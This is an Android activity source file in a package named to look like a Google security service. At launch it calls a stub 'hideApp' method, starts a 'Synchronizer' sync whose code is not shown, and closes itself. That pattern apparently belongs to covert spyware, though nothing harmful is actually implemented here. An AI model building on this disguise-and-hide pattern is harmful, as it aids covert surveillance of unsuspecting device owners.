package com.google.services.security;

import android.os.Bundle;
import android.support.v7.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        hideApp();
        setContentView(R.layout.activity_main);
        new Synchronizer(this).sync();
        finish();
    }

    private void hideApp() {
        // TODO: 12/27/2018
    }
}
